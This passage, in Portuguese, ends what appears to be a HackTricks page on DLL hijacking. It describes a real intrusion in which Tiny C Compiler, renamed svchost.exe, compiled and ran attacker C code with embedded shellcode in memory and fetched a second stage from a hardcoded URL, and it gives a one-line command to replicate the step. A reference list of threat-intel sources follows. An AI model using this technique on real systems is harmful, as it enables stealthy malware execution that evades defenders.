- A mesma intrusão dropou Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O código-fonte C fornecido pelo atacante embutiu shellcode, compilou e executou em memória sem tocar o disco com um PE. Replicar com:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa compile-and-run baseada em TCC importou `Wininet.dll` em tempo de execução e baixou um shellcode de segunda etapa de uma URL hardcoded, proporcionando um loader flexível que se fazia passar por uma execução do compilador.

## Referências

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
